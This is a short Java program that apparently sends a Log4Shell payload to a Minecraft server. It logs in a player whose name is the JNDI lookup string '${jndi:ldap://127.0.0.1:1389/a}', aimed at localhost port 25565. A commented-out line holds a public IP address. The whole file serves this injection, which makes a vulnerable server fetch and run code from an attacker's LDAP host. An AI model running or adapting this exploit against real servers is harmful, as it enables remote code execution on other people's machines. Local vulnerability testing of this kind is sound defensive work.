import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class Sendtest {
	public static void main(String [] args){
		List<PlayerLogin> player_list = new ArrayList<>();
		//String address = "58.156.172.100";
		String address = "127.0.0.1";
		int port = 25565;
		int num_player = 1;

		for(int i = 0; i < num_player; i++) {
			PlayerLogin p = new PlayerLogin(address, port, "${jndi:ldap://127.0.0.1:1389/a}"+String.valueOf(i));
			try {
				p.PlayerState();
			} catch (IOException e) {
				e.printStackTrace();
			}
			player_list.add(p);
		}

	    int cnt = 0;
	    while(true) {
	        try {
	        	 Thread.sleep(1000);
	        	} catch (InterruptedException e) {
	        }
	        cnt++;
	        if(cnt >= 30) break;
	    }

		System.out.println("Done!");
	}
}